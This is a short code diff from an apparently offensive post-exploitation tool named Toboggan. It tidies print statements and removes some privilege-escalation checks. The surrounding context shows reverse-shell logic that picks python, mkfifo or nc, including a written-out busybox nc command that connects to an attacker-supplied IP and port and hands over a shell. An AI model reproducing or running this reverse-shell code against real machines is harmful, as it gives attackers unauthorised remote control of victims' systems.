@@ -29,8 +29,6 @@ class OSHandler(ABC):
         # Number of _execute function calls
         num_commands = 4
 
-        print("[Toboggan] Fetching machine details...")
-
         start_time = time.time()
         self._user = self._execute("whoami").strip()
         total_time += (time.time() - start_time) * 1000  # Convert time to milliseconds
@@ -258,7 +256,7 @@ class UnixHandler(OSHandler):
                 timeout=2,
                 retry=False,
             )
-            print(f"[Toboggan] python revershell sent.")
+            print("[Toboggan] python revershell sent.")
         elif self._execute("command -v nc").strip():
             if self._execute("command -v mkfifo").strip():
                 self._execute(
@@ -266,14 +264,14 @@ class UnixHandler(OSHandler):
                     timeout=2,
                     retry=False,
                 )
-                print(f"[Toboggan] mkfifo revershell sent.")
+                print("[Toboggan] mkfifo revershell sent.")
             else:
                 self._execute(
                     f"/bin/busybox nc {ip_addr} {port} -e {shell}",
                     timeout=2,
                     retry=False,
                 )
-                print(f"[Toboggan] nc revershell sent.")
+                print("[Toboggan] nc reverse shell sent.")
         else:
             print("[Toboggan] No possible reverse shell methods found.")
 
@@ -292,10 +290,6 @@ class UnixHandler(OSHandler):
         self.__analyse_path_variable()
         self.__analyse_aslr()
         self.__analyse_ptrace_scope()
-        # Potential vulnerabilities or misconfigurations
-        self.__analyse_weak_file_permissions()
-        self.__analyse_readable_files_other_users()
-        self.__analyse_no_owners_files()
 
     # Private methods
     def __analyse_readable_files_other_users(self) -> None:
